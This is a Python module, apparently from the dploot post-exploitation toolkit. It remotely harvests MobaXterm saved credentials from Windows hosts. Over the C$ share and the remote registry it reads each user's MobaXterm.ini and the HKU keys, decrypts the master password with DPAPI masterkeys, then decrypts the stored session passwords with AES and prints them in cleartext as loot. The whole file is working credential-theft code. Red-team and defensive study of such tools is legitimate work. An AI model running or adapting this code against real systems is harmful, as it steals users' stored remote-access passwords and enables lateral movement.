from base64 import b64decode
import logging
import ntpath
from typing import Dict, List, Tuple, Optional, Callable
from Cryptodome.Cipher import AES


from dploot.triage import Triage
from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.network import DPLootConnection
from dploot.lib.target import Target
from dploot.triage.masterkeys import Masterkey
from dataclasses import dataclass


@dataclass
class MobaXtermPassword:
    winuser: str
    username: str
    password_encrypted: bytes
    password: bytes = None

    def decrypt(self, masterpassword_key):
        iv = AES.new(key=masterpassword_key, mode=AES.MODE_ECB).encrypt(
            b"\x00" * AES.block_size
        )
        cipher = AES.new(
            key=masterpassword_key, iv=iv, mode=AES.MODE_CFB, segment_size=8
        )
        self.password = cipher.decrypt(b64decode(self.password_encrypted))

    def dump(self) -> None:
        print("[MOBAXTERM PASSWORD]")
        print("Username:\t%s" % self.username)
        if self.password is not None:
            print("Password:\t%s" % self.password.decode("latin-1"))
        print()

    def dump_quiet(self) -> None:
        print(f"[MOBAXTERM PASSWORD] {self.username}:{self.password}")


@dataclass
class MobaXtermCredential:
    winuser: str
    name: str
    username: str
    password_encrypted: bytes
    password: bytes = None

    def decrypt(self, masterpassword_key):
        iv = AES.new(key=masterpassword_key, mode=AES.MODE_ECB).encrypt(
            b"\x00" * AES.block_size
        )
        cipher = AES.new(
            key=masterpassword_key, iv=iv, mode=AES.MODE_CFB, segment_size=8
        )
        self.password = cipher.decrypt(b64decode(self.password_encrypted))

    def dump(self) -> None:
        print("[MOBAXTERM CREDENTIAL]")
        print("Name:\t\t%s" % self.name)
        print("Username:\t%s" % self.username)
        if self.password is not None:
            print("Password:\t%s" % self.password.decode("latin-1"))
        print()

    def dump_quiet(self) -> None:
        print(
            f"[MOBAXTERM CREDENTIAL] {self.name} - {self.username}:{self.password}"
        )


@dataclass
class MobaXtermMasterPassword:
    winuser: str
    username: str
    host: str
    entropy: bytes
    masterpassword_raw_value: bytes
    masterpassword_decrypted: bytes = None
    _key: bytes = None

    def decrypt_masterpassword_raw_value(self, masterkeys):
        dpapi_blob = bytes.fromhex(
            "01000000d08c9ddf0115d1118c7a00c04fc297eb"
        ) + b64decode(self.masterpassword_raw_value)
        masterkey = find_masterkey_for_blob(dpapi_blob, masterkeys)
        if masterkey is not None:
            self.masterpassword_decrypted = decrypt_blob(
                blob_bytes=dpapi_blob, masterkey=masterkey, entropy=self.entropy
            )
        return self.masterpassword_decrypted is not None

    @property
    def key(self):
        if self._key is not None:
            return self._key
        if self.masterpassword_decrypted is None:
            return self.masterpassword_decrypted

        self._key = b64decode(self.masterpassword_decrypted)[0:32]
        return self._key

    def dump(self) -> None:
        print("[MOBAXTERM MASTERPASSWORD KEY]")
        print("Host:\t\t\t%s" % self.host)
        print("Username:\t\t%s" % self.username)
        if self.masterpassword_decrypted is not None:
            print(
                "MasterPassword Key:\t%s"
                % b64decode(self.masterpassword_decrypted).hex()
            )
        print()

    def dump_quiet(self) -> None:
        print(
            f"[MOBAXTERM MASTERPASSWORD KEY] {self.host} - {self.username} - {b64decode(self.masterpassword_decrypted).hex()}"
        )


class MobaXtermTriage(Triage):    
    mobaxterm_conf_file_path = "Users\\{username}\\AppData\\Roaming\\MobaXterm\\MobaXterm.ini"
    mobaxterm_registry_key_path = "SOFTWARE\\Mobatek\\MobaXterm"
    mobaxterm_sessionp_key_path = ntpath.join(mobaxterm_registry_key_path, "SessionP")
    mobaxterm_masterpassword_registry_key = "M"
    mobaxterm_passwords_registry_key = "P"
    mobaxterm_credentials_registry_key = "C"

    ntuser_dat_path = "Users\\{username}\\NTUSER.DAT"
    share = "C$"

    def __init__(
        self,
        target: Target,
        conn: DPLootConnection,
        masterkeys: List[Masterkey],
        per_secret_callback: Callable = None,
        false_positive: List[str] | None = None,
    ) -> None:
        super().__init__(
            target, 
            conn, 
            masterkeys=masterkeys, 
            per_loot_callback=per_secret_callback, 
            false_positive=false_positive
        )
        self._users = None

    def triage_mobaxterm(
        self, offline_users: bool = False
    ) -> Tuple[
        List[MobaXtermMasterPassword], List["MobaXtermCredential | MobaXtermPassword"]
    ]:
        logging.getLogger("impacket").disabled = True
        mobaxterm_credentials = []
        mobaxterm_masterpassword_key = []
        for user, sid in self.users.items():
            try:
                masterpassword_key, credentials = self.triage_mobaxterm_for_user(
                    user, sid, offline_users
                )
                if masterpassword_key is not None:
                    mobaxterm_credentials += credentials
                    mobaxterm_masterpassword_key.append(masterpassword_key)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                    logging.debug(str(e))
        return mobaxterm_masterpassword_key, mobaxterm_credentials

    def triage_mobaxterm_for_user(
        self, user: str, sid: Optional[str] = None, offline_users: bool = False
    ) -> Tuple[
        MobaXtermMasterPassword, List["MobaXtermCredential | MobaXtermPassword"]
    ]:
        mobaxterm_masterpassword = None
        mobaxterm_credentials = []

        mobaxterm_masterpassword, mobaxterm_credentials = self.extract_mobaxtermkeys_for_user_from_files(user, sid)
        if mobaxterm_masterpassword is None or len(mobaxterm_credentials) == 0:

            logging.debug(f"Triaging MobaXterm for user {user}")
            mobaxterm_masterpassword, mobaxterm_credentials = (
                self.extract_mobaxtermkeys_for_user_from_remote_registry(user, sid)
            )

        return mobaxterm_masterpassword, mobaxterm_credentials


    def extract_entropy_for_user(self, user: str, sid: str):
        # Extract entropy
        entropy = None
        try:
            entropy = self.conn.reg_get_key_value("HKU", ntpath.join(sid, self.mobaxterm_registry_key_path), "SessionP")
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.debug(f"Error while getting SessionP (entropy) in HKU\\{sid}\\{self.mobaxterm_registry_key_path}: {e}")
        return entropy

    def extract_mobaxtermkeys_for_user_from_files(self, user: str, sid: str) -> Tuple[
        MobaXtermMasterPassword, List["MobaXtermCredential | MobaXtermPassword"]
    ]:
        mobaxterm_masterpassword_key = None
        mobaxterm_credentials = []

        # Extract entropy
        entropy = self.extract_entropy_for_user(user, sid)
        if entropy is None:
            return None, []
        
        # Extract all
        try:
            conf_file = self.conn.read_file(
                share=self.share, path=self.mobaxterm_conf_file_path.format(username=user), looted_files=self.looted_files
            )
            dpapi_blob = conf_file.split(b"[Sesspass]\r\n")[1].split(b"\r\n")[0].split(b"=",1)[1]
            mobaxterm_masterpassword_key = MobaXtermMasterPassword(
                winuser=user,
                entropy=entropy,
                host="",
                username="",
                masterpassword_raw_value=dpapi_blob
            )
            
            if mobaxterm_masterpassword_key.decrypt_masterpassword_raw_value(
                masterkeys=self.masterkeys
            ):
                logging.debug(f"Found Mobaxterm MasterPassword for user {user}")
            else:
                return mobaxterm_masterpassword_key, mobaxterm_credentials
            
            credentials = conf_file.split(b"[Credentials]\r\n")[1].split(b"\r\n\r\n")[0]
            for credential in credentials.split(b"\r\n"):
                name, username = credential.decode().split("=",1)
                username, password_encrypted = username.split(":",1)
                mobaxterm_credential = MobaXtermCredential(
                    winuser=user,
                    name=name,
                    username=username,
                    password_encrypted=password_encrypted,
                )
                mobaxterm_credential.decrypt(mobaxterm_masterpassword_key.key)
                mobaxterm_credentials.append(mobaxterm_credential)
                if self.per_loot_callback is not None:
                    self.per_loot_callback(mobaxterm_credential)

            passwords = conf_file.split(b"[Passwords]\r\n")[1].split(b"\r\n\r\n")[0]
            for password in passwords.split(b"\r\n"):
                username, encrypted_pass = password.decode().split("=",1)
                mobaxterm_credential = MobaXtermPassword(
                    winuser=user, username=username, password_encrypted=encrypted_pass
                )
                mobaxterm_credential.decrypt(mobaxterm_masterpassword_key.key)
                mobaxterm_credentials.append(mobaxterm_credential)
                if self.per_loot_callback is not None:
                    self.per_loot_callback(mobaxterm_credential)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.debug(str(e))
        return mobaxterm_masterpassword_key, mobaxterm_credentials

    def extract_mobaxtermkeys_for_user_from_remote_registry(
        self, user: str, sid: str
    ) -> Tuple[
        MobaXtermMasterPassword, List["MobaXtermCredential | MobaXtermPassword"]
    ]:
        mobaxterm_masterpassword_key = None
        mobaxterm_credentials = []

        # Extract entropy
        entropy = self.extract_entropy_for_user(user, sid)
        if entropy is None:
            return None, []
        
        # Extract M
        value_name = self.conn.reg_enum_values("HKU",
                                          ntpath.join(sid, 
                                            self.mobaxterm_registry_key_path, 
                                            self.mobaxterm_masterpassword_registry_key
                                        ))
        value_name = value_name[0]
        value_data = self.conn.reg_get_key_value("HKU", 
                                    ntpath.join(sid, 
                                        self.mobaxterm_registry_key_path, 
                                        self.mobaxterm_masterpassword_registry_key
                                        ),
                                    value_name
                                    )
        name, host = value_name.split("@")
        mobaxterm_masterpassword_key = MobaXtermMasterPassword(
            winuser=user,
            entropy=entropy.encode(),
            host=host,
            username=name,
            masterpassword_raw_value=value_data.encode(),
        )
        if mobaxterm_masterpassword_key.decrypt_masterpassword_raw_value(
            masterkeys=self.masterkeys
        ):
            logging.debug(f"Found Mobaxterm MasterPassword for user {user}")
        else:
            return mobaxterm_masterpassword_key, mobaxterm_credentials
        
        mobaxterm_masterpassword_key.dump()

        if mobaxterm_masterpassword_key is None:
            return None, []
        # Extract C and P
        for key in [
            self.mobaxterm_credentials_registry_key,
            self.mobaxterm_passwords_registry_key,
        ]:
            for value_name in self.conn.reg_enum_values("HKU",
                                          ntpath.join(sid, 
                                            self.mobaxterm_registry_key_path, 
                                            self.mobaxterm_masterpassword_registry_key
                                        )):
                value_data = self.conn.reg_get_key_value("HKU", 
                                    ntpath.join(sid, 
                                        self.mobaxterm_registry_key_path, 
                                        self.mobaxterm_masterpassword_registry_key
                                        ),
                                    value_name
                                    )
                if ":" in value_data:
                    username, password_encrypted = value_data.split(b":")
                    mobaxterm_credential = MobaXtermCredential(
                        winuser=user,
                        name=name,
                        username=username.decode(
                            "utf-16le", errors="backslashreplace"
                        ),
                        password_encrypted=password_encrypted.encode(),
                    )
                else:
                    mobaxterm_credential = MobaXtermPassword(
                        winuser=user, username=name, password_encrypted=value_data.encode()
                    )
                mobaxterm_credential.decrypt(mobaxterm_masterpassword_key.key)
                mobaxterm_credentials.append(mobaxterm_credential)
                if self.per_loot_callback is not None:
                    self.per_loot_callback(mobaxterm_credential)
        return mobaxterm_masterpassword_key, mobaxterm_credentials

    @property
    def users(self) -> Dict[str, str]:
        """Returns dict of username: sid"""
        if self._users is not None:
            return self._users

        users = {}
        userlist_key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList"

        for sid in self.conn.reg_enum_key("HKLM",userlist_key):
            profile_path = self.conn.reg_get_key_value("HKLM",f"{userlist_key}\\{sid}","ProfileImagePath")
            if "C:\\Users" not in profile_path:
                continue
            users[ntpath.basename(profile_path).rstrip("\0")] = sid.rstrip("\0")
        self._users = users
        return self._users